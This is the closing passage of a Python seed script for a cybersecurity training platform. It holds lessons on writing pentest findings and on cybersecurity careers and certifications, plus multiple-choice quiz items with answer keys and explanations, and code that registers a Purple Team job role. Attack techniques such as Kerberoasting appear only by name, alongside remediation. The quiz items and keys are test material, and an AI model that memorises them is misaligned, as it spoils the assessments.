> **Business Impact:** An attacker with any domain user account can compromise service accounts, which in this environment have administrative access to SQL Server and the web application server. This provides a path to data exfiltration and full application compromise.
> 
> **Remediation:** (1) Immediately reset `sql_svc` and `web_svc` passwords to random 25+ character strings using a password manager. (2) Implement Microsoft Group Managed Service Accounts (gMSA) for all service accounts. (3) Enable AES-only Kerberos encryption for service accounts (disable RC4).

### Communication by Audience

| Audience | Focus | Language |
|----------|-------|---------|
| CISO/Board | Business risk, financial exposure | Non-technical, ROI-focused |
| IT Management | What to fix, priority, resources | Semi-technical, operational |
| Sysadmin/Dev | Exact steps to remediate | Technical, specific |
| Legal/Compliance | Regulatory implications | Compliance-framework mapped |
""",
            lab_guide_md="""## Lab: Write a Professional Pentest Finding

### Scenario: You completed a Kerberoasting attack on GOAD and cracked the sql_svc password. Write the full finding entry.

### Exercise 1 — CVSS Scoring
Use the CVSS calculator (first.org/cvss/calculator/3.1) to score Kerberoasting:
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (any domain user)
- User Interaction: None
- Scope: Unchanged
- Confidentiality: High
- Integrity: High
- Availability: High

Record your score and vector string.

### Exercise 2 — Write the Finding
Using the template above, write:
1. Title
2. CVSS Score + vector
3. Affected systems (with specific hostnames/accounts)
4. Description (2-3 paragraphs)
5. Evidence: include redacted command output showing the cracked hash
6. Business impact (2-3 sentences)
7. Remediation (numbered steps)

### Exercise 3 — Executive Summary
Write a 150-word executive summary covering:
- What you tested
- Overall risk posture
- Top 3 concerns (no technical jargon)
- Recommended immediate actions

### Mastery Check
- [ ] CVSS score correctly calculated with vector string
- [ ] Finding clearly identifies specific affected accounts/systems
- [ ] Evidence section redacts sensitive information appropriately
- [ ] Remediation steps are specific, prioritised, and actionable
- [ ] Executive summary is jargon-free and understood by a non-technical reader
""",
            assessment_md="""## Self-Assessment
1. What is the difference between an executive summary and technical summary in a pentest report?
2. What does CVSS Attack Complexity (AC) measure?
3. Why should remediation steps be numbered rather than written as a paragraph?
4. What CWE number covers improper authentication?
5. How would you communicate a Critical finding to a CISO who is not technical?
""",
            real_world_md="""## Real-World Context

**Career impact:** Many candidates with excellent technical skills fail to get hired because they cannot communicate findings. A well-written report sample in your portfolio is worth more than 5 extra CTF flags.

**Industry standard:** PTES (Penetration Testing Execution Standard) and OWASP Testing Guide provide the frameworks most professional reports follow.

**Certification:** OSCP requires a 24-hour practical exam followed by a professional report submission. TCM Security's PNPT is entirely report-based. Both assess writing quality as part of the grade.
""",
        )
        all_topics.append(t)
        _questions(t, sa_prof.id, [
            ("A CVSS v3.1 vector of AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H results in a score close to 10.0 (Critical). Which metric change would most significantly reduce the score?",
             ["Changing Attack Vector from Network to Local (AV:L)", "Changing User Interaction from None to Required (UI:R)", "Changing Scope from Changed to Unchanged (S:U)", "Changing Attack Complexity from Low to High (AC:H)"],
             2, "Scope:Changed (S:C) significantly boosts the CVSS score because the impact extends beyond the vulnerable component to other systems. Changing to Unchanged (S:U) caps the score and lowers it substantially. For a 10.0-scoring vuln, this has the largest effect.", 3),
            ("Which section of a penetration test report is specifically written for a non-technical CISO audience and focuses on business risk?",
             ["Appendix — Scope and Methodology", "Technical Summary — Risk Breakdown", "Executive Summary", "Finding Detail — Evidence Section"],
             2, "The Executive Summary targets C-level executives and focuses on business risk, financial exposure, and strategic recommendations — using plain language without technical jargon or command-line output.", 1),
            ("A finding states: 'SQL injection was found.' Why is this an insufficient finding description?",
             ["It should only include CVSS score, not a description", "It lacks specificity: missing the affected parameter, endpoint, impact, evidence, and actionable remediation steps", "SQL injection does not require a description because it is a known vulnerability", "The finding should only be listed in the appendix"],
             1, "A professional finding must identify: the specific vulnerable parameter and endpoint, what data is accessible or what actions are possible, reproduction steps (evidence), business impact, and specific remediation. Vague findings cannot be actioned by remediation teams.", 2),
        ])

        # ─── Professional Dev Topic 2 ────────────────────────────────────
        t = _topic(
            skill_area_id=sa_prof.id, week_id=week_objs[2].id,
            title="Cybersecurity Career Roadmap & Certifications",
            slug="cybersecurity-career-certifications",
            description="Plan your 3-month job-ready path and long-term career trajectory with the right certifications for Purple Team roles.",
            difficulty=1, estimated_minutes=60,
            theory_md="""## Cybersecurity Career Roadmap: Zero to Purple Team

### The 3-Month Job-Ready Path

```
Month 1 — Foundations (Job-Ready Minimum)
├── Week 1-2: Networking + Linux fundamentals
├── Week 3: OSINT + Passive Recon
└── Milestone: Pass eJPT (Entry Job Penetration Tester) — €200

Month 2 — Core Technical Skills
├── Week 4-7: Active Directory attacks (Kerberoasting, PtH, lateral movement)
├── Week 6-8: Detection + Sigma rules
└── Milestone: Complete BTL1 (Blue Team Labs Level 1) — £99

Month 3 — Purple Team Integration + Career
├── Week 9-11: Threat hunting + IR + malware analysis basics
├── Week 12: Capstone project + portfolio
└── Milestone: PNPT (Practical Network Penetration Tester) — $399
             OR BTL2 + SC-200 combo for Blue/Purple path
```

### Certification Roadmap by Career Track

**Purple Team Operator (Recommended path):**
```
Foundation: CompTIA Security+ → eJPT → BTL1
Mid-level: PNPT → eCPPT → SC-200 (Microsoft)
Advanced: OSCP → CRTP → CRTO → Certified Purple Team Professional
```

**SOC Analyst path:**
```
Foundation: Security+ → BTL1 → CySA+
Mid-level: SC-200 → GCIA → GCIH
Advanced: GDAT → SANS FOR508 → GREM
```

**Red Team Operator path:**
```
Foundation: eJPT → PNPT → OSCP
Mid-level: CRTP → CRTO → eCPPTv2
Advanced: OSED → OSMR → CRTE
```

### Certification Cost & ROI (INR estimates)

| Cert | Cost (approx) | Prepares For | Salary Impact |
|------|--------------|--------------|---------------|
| eJPT | ~₹15,000 | Entry-level pentesting | +₹1-2 LPA |
| BTL1 | ~₹8,000 | SOC Analyst L1-L2 | +₹1.5 LPA |
| Security+ | ~₹25,000 | CompTIA baseline | Required by many |
| OSCP | ~₹70,000 | Senior pentester | +₹5-10 LPA |
| CRTP | ~₹12,000 | AD specialist | +₹3-5 LPA |
| SC-200 | ~₹15,000 | Microsoft security | +₹2-4 LPA |

### Building Your Portfolio (Internship-Focused)

Essential portfolio components for getting an internship in 3 months:

1. **GitHub Repository:** 5+ security scripts (Bash, Python)
2. **WriteUps:** 10+ HackTheBox or TryHackMe machine walkthroughs
3. **Lab Documentation:** Document your GOAD attacks and defences
4. **Blog/LinkedIn Posts:** Write about what you're learning weekly
5. **Capstone Report:** Professional pentest report from the GOAD exercise
6. **CTF Participation:** 1-2 CTF events (PicoCTF, HackTheBox, CTFtime.org)

### LinkedIn Optimisation

```
Headline: "Cybersecurity Student | Penetration Testing | Blue Team | Purple Team"
About: 3 sentences: what you know, what you've done, what you're seeking
Skills: Add and take LinkedIn skill assessments
Featured: Pin your best blog post or writeup
Activity: Comment on security professional posts 5x/week
```

### Interview Preparation

**Technical questions to prepare:**
1. Explain the Kerberos authentication flow
2. How would you detect Pass-the-Hash in Windows event logs?
3. What is the difference between a SYN scan and connect scan?
4. Walk me through your methodology for a web application pentest
5. How do you write a Sigma detection rule?

**Behavioural questions:**
1. Describe a time you had to learn a new tool quickly
2. How do you stay updated on new vulnerabilities and threat intelligence?
3. Tell me about a CTF or lab challenge that stumped you — what did you do?
""",
            lab_guide_md="""## Lab: Career Planning Workshop

### Exercise 1 — 90-Day Career Plan
Create a spreadsheet with:
- Week-by-week learning objectives (use curriculum weeks from this platform)
- 3 certifications to target (with target exam date)
- 10 HackTheBox/TryHackMe machines to complete
- 5 CTFs to participate in (find on ctftime.org)

### Exercise 2 — LinkedIn Profile Audit
- Add all certifications and skills
- Write a 300-character headline
- Write a 2000-character About section
- Connect with 20 security professionals

### Exercise 3 — Portfolio GitHub Setup
```bash
mkdir ~/portfolio
cd ~/portfolio
git init

# Create README.md
cat > README.md << 'EOF'
# Cybersecurity Portfolio

## About Me
Purple Team practitioner focused on Active Directory security, detection engineering, and threat hunting.

## Projects
- [AD Attack Lab](./goad-lab/) — GOAD attack/detect exercises with Sigma rules
- [Bash Security Scripts](./scripts/) — Log parsers, SUID auditors, and alert scripts
- [CTF Writeups](./ctf/) — Detailed walkthroughs of completed challenges
EOF

# Add first script
mkdir scripts
# Add your Bash log parser script from the Linux module
cp ~/bash_log_parser.sh scripts/
git add . && git commit -m "Initial portfolio setup"
```

### Mastery Check
- [ ] 90-day career plan documented
- [ ] LinkedIn profile complete with security focus
- [ ] GitHub portfolio repository created with README
- [ ] 5 security professionals connected on LinkedIn
- [ ] First writeup draft completed (any TryHackMe room)
""",
            assessment_md="""## Self-Assessment
1. What 3 certifications form the recommended foundation for a Purple Team path?
2. Which platform is best for practicing AD attacks (free tier available)?
3. What should be the key components of a cybersecurity portfolio?
4. Why is documenting your learning journey valuable for job applications?
5. What are 5 technical questions to prepare for cybersecurity interviews?
""",
            real_world_md="""## Real-World Context

**Market reality:** The Indian cybersecurity job market is growing at 40% annually. Entry-level roles (SOC Analyst, Junior Pentester) pay ₹3-6 LPA. Mid-level Purple Team roles reach ₹12-25 LPA. Senior roles exceed ₹40 LPA.

**Internship timeline:** With eJPT + 10 HTB writeups + GOAD lab documentation, you are competitive for cybersecurity internships at companies like TCS, Infosys Security, Wipro CyberSecurity, and startups like Sequretek and TAC Security.

**Networking:** Attend null Chapter meetups (Bangalore, Pune, Mumbai, Delhi), BsidesBangalore, and c0c0n to meet practitioners and find opportunities.
""",
        )
        all_topics.append(t)
        _questions(t, sa_prof.id, [
            ("Which certification is specifically designed for entry-level penetration testing and uses a practical exam format?",
             ["CompTIA Security+", "eJPT (eLearnSecurity Junior Penetration Tester)", "CISSP (Certified Information Systems Security Professional)", "CISM (Certified Information Security Manager)"],
             1, "eJPT by INE/eLearnSecurity is an entry-level practical exam requiring hands-on penetration testing against a real network. It's cost-effective (~$200) and widely recognised as a starting point for pentesters.", 1),
            ("For a 3-month goal of landing a cybersecurity internship, which combination of portfolio elements is most impactful?",
             ["Just passing a certification exam", "GitHub with security scripts + 10 HTB/THM writeups + capstone pentest report + active LinkedIn", "Completing 50 TryHackMe rooms only", "Attending online webinars and collecting certificates"],
             1, "Employers want to see hands-on evidence of skill. A combination of practical writeups, original scripts, a professional report sample, and LinkedIn presence demonstrates both technical ability and communication skills.", 2),
            ("Which MITRE ATT&CK resource would you use to plan your certification and skill development to cover the most relevant attack techniques?",
             ["MITRE CVE database", "MITRE ATT&CK Navigator — to visualise coverage and identify gaps", "MITRE CAPEC pattern database", "MITRE STIX/TAXII threat sharing platform"],
             1, "ATT&CK Navigator allows you to mark techniques you have learned and visualise gaps. Professionals use it to align training to the TTPs most relevant to their environment and industry threat actors.", 2),
        ])

        db.session.flush()
        print(f"[+] Topics seeded: {len(all_topics)} topics across 6 pillars.")

        # ── MASTER PURPLE TEAM EXPERT JOB ROLE ───────────────────────────
        # Upsert this track without removing other roles or user progress.
        role, _ = _get_or_create(JobRole, {"slug": "master-purple-team-expert"}, {
            "name": "Master Purple Team Expert",
            "description": (
                "The Master Purple Team Expert track bridges offensive (Red Team) and defensive (Blue Team) "
                "disciplines into a unified mastery path. Learn host & network attack vectors, Active Directory "
                "exploitation, threat hunting, Sigma rule development, and incident response."
            ),
            "avg_salary_note": "₹12-35 LPA (India) | $90-180k (US) | £60-120k (UK)",
            "recommended_certs": json.dumps([
                "eJPT", "BTL1", "PNPT", "CRTP", "SC-200", "OSCP", "CRTO", "Certified Purple Team Professional"
            ]),
            "icon_url": "/static/img/skill_logo.ico",
            "icon_emoji": "🟣",
            "color_hex": "#a855f7",
            "difficulty_label": "Mastery",
            "is_default": True,
            "is_active": True,
        })
        role.name = "Master Purple Team Expert"
        role.is_default = True
        role.is_active = True
        db.session.flush()

        # Map all topics to the role in order
        for idx, topic in enumerate(all_topics):
            mapping = JobRoleTopic.query.filter_by(
                job_role_id=role.id, topic_id=topic.id).first()
            if mapping is None:
                mapping = JobRoleTopic(job_role_id=role.id, topic_id=topic.id)
                db.session.add(mapping)
            mapping.order_index = idx
            mapping.is_core = True

        db.session.commit()

        # ── Final Report ──────────────────────────────────────────────────
        from models import (
            SkillArea as SA, Topic as T, CurriculumWeek as CW,
            AssessmentQuestion as AQ, JobRole as JR, JobRoleTopic as JRT,
        )
        print("")
        print("=" * 70)
        print("  Seed Complete — Summary")
        print("=" * 70)
        print(f"  SkillAreas:          {SA.query.count()}")
        print(f"  CurriculumWeeks:     {CW.query.count()}")
        print(f"  Topics:              {T.query.count()}")
        print(f"  AssessmentQuestions: {AQ.query.count()}")
        print(f"  JobRoles:            {JR.query.count()}")
        print(f"  JobRoleTopics:       {JRT.query.count()}")
        print("=" * 70)
        print("  Purple Team Operator role set as default track.")
        print("  Run the app and visit /job_roles to start your roadmap.")
        print("=" * 70)


if __name__ == "__main__":
    main()
